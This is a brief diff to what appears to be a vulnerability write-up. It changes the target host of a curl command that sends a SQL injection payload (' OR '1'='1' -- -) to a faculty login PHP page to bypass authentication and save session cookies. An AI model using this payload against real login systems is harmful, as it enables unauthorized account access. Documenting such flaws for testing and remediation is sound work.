@@ -171,7 +171,7 @@ without requiring valid credentials.
 ## Using curl
 
 ```bash
-curl -i -X POST http://172.25.44.135:9292/loginlinkfaculty.php \
+curl -i -X POST http://127.0.0.1:9292/loginlinkfaculty.php \
   --data-urlencode "fid=1' OR '1'='1' -- -" \
   --data-urlencode "pass=x" \
   -c cookies.txt
